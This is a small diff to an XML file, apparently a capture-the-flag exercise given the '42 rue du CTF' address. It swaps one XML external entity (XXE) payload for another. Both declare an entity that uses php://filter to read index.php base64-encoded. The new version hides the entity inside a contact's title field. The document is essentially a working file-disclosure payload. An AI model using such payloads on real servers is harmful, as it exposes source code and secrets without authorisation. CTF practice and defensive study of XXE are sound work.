@@ -1,6 +1,10 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE title [
-<!ELEMENT title ANY >
-<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
-]>
-<title>&xxe;</title>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <title>Jean &xxe; Dupont</title>
+    <phone>00 11 22 33 44</phone>
+    <address>42 rue du CTF</address>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
